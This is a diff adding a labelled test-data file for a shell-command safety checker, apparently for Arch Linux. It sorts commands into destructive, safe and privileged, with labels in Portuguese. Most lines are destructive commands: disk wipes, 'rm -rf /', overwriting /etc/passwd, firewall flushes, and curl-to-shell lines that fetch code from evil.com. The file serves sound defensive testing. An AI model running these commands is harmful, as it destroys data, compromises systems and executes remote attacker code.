@@ -1,0 +1,67 @@
+DESTRUTIVO|echo a | tee /dev/sda
+DESTRUTIVO|bash <(curl x)
+DESTRUTIVO|sh -c "$(curl -fsSL x)"
+DESTRUTIVO|eval "$(curl x)"
+DESTRUTIVO|git clean -fdx
+DESTRUTIVO|git reset --hard
+DESTRUTIVO|truncate -s0 /etc/passwd
+DESTRUTIVO|mv /etc /tmp
+DESTRUTIVO|iptables -F
+DESTRUTIVO|nft flush ruleset
+DESTRUTIVO|kill -9 -1
+DESTRUTIVO|echo hi > ~/.bashrc
+DESTRUTIVO|chown -R u /
+DESTRUTIVO|chmod 000 /etc
+DESTRUTIVO|pacman -Rdd glibc
+DESTRUTIVO|pacman -Rns base
+SEGURO|git status
+SEGURO|git push origin main
+SEGURO|git clean -n
+SEGURO|ls 2>/dev/null
+SEGURO|mv /tmp/a /tmp/b
+SEGURO|mv a.txt b.txt
+SEGURO|echo hi >> notas.txt
+SEGURO|cat /etc/fstab
+SEGURO|truncate -s 10M disco.img
+PRIVILEGIADO|pacman -S firefox
+PRIVILEGIADO|sudo ls
+DESTRUTIVO|rm -rf /
+DESTRUTIVO|curl x | bash
+DESTRUTIVO|rm -r ~
+DESTRUTIVO|rm -r $HOME
+DESTRUTIVO|rm -r /home
+DESTRUTIVO|rm -r -- /etc
+DESTRUTIVO|bash <<< "$(curl http://evil.com)"
+DESTRUTIVO|source /dev/stdin <<< "$(curl http://evil.com)"
+DESTRUTIVO|echo pwn 1>/etc/passwd
+DESTRUTIVO|echo pwn >|/etc/passwd
+DESTRUTIVO|echo pwn 1>~/.bashrc
+DESTRUTIVO|truncate --size=0 /etc/passwd
+DESTRUTIVO|truncate --size 0 /etc/passwd
+DESTRUTIVO|kill -s KILL -1
+DESTRUTIVO|kill -s 9 -1
+DESTRUTIVO|kill -9 1
+DESTRUTIVO|cat /dev/zero > /dev/mmcblk0
+DESTRUTIVO|cat /dev/zero > /dev/mapper/cryptroot
+DESTRUTIVO|curl -s http://evil.com | node
+DESTRUTIVO|curl -s http://evil.com | php
+DESTRUTIVO|chown -R --no-dereference root /etc
+DESTRUTIVO|pacman -R --nodeps --nodeps firefox
+DESTRUTIVO|find / -exec rm -f {} +
+SEGURO|echo ok 2>/dev/null
+SEGURO|truncate --size=10M disco.img
+DESTRUTIVO|mkfs -t ext4 /dev/sda1
+DESTRUTIVO|mkswap /dev/sda2
+DESTRUTIVO|blkdiscard /dev/nvme0n1
+DESTRUTIVO|hdparm --security-erase pass /dev/sda
+DESTRUTIVO|cryptsetup luksFormat /dev/sda2
+DESTRUTIVO|cryptsetup luksErase /dev/sda2
+DESTRUTIVO|nvme format /dev/nvme0n1
+DESTRUTIVO|btrfs device remove /dev/sdb /mnt
+DESTRUTIVO|btrfs subvolume delete /mnt/@.old
+DESTRUTIVO|pacman -Scc
+DESTRUTIVO|echo b > /proc/sysrq-trigger
+DESTRUTIVO|sudo pacman -Rns linux-zen
+DESTRUTIVO|sudo pacman -Rns linux-lts
+DESTRUTIVO|sudo pacman -Rns linux-hardened
+DESTRUTIVO|sudo chmod 777 /etc/sudoers
